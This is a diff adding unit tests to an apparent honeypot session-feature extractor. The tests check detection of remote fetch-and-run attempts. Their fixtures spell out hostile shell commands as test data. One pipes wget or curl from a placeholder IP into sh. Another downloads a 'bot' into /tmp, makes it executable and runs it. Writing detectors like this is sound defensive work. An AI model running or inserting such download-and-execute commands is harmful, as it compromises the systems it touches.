@@ -479,6 +479,54 @@ def test_non_http_session_never_populates_http_user_agents():
     assert features.http_known_scanner_user_agent is False
 
 
+def test_download_piped_into_a_shell_is_flagged_as_fetch_and_run():
+    session = create_session([
+        ("login: root", 0.0),
+        ("password: admin", 0.0),
+        ("uname -a; (wget -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s ssh", 1.0),
+    ])
+
+    features = extract_session_features(session)
+
+    assert features.remote_fetch_and_run_attempt is True
+
+
+def test_download_then_chmod_in_separate_commands_is_flagged_as_fetch_and_run():
+    session = create_session([
+        ("cd /tmp", 1.0),
+        ("/usr/bin/wget http://203.0.113.9/bot", 2.0),
+        ("chmod 777 bot", 3.0),
+        ("./bot", 4.0),
+    ])
+
+    features = extract_session_features(session)
+
+    assert features.remote_fetch_and_run_attempt is True
+
+
+def test_download_without_a_run_step_is_not_flagged():
+    session = create_session([("wget http://203.0.113.9/notes.txt", 1.0), ("chmod 400 notes.txt", 2.0)])
+
+    features = extract_session_features(session)
+
+    assert features.remote_fetch_and_run_attempt is False
+
+
+def test_fetch_and_run_ignores_credential_lines_and_lookalike_names():
+    """A password is attacker-chosen text, and "out_wget"/"mycurl" are
+    filenames -- neither is a download tool being run."""
+    session = create_session([
+        ("login: root", 0.0),
+        ("password: wget x | sh", 0.0),
+        ("cat out_wget mycurl", 1.0),
+        ("ps aux | shuf", 2.0),
+    ])
+
+    features = extract_session_features(session)
+
+    assert features.remote_fetch_and_run_attempt is False
+
+
 def test_handles_malformed_shell_input_as_observed_command():
     """Malformed input should remain measurable without crashing extraction."""
     session = create_session([
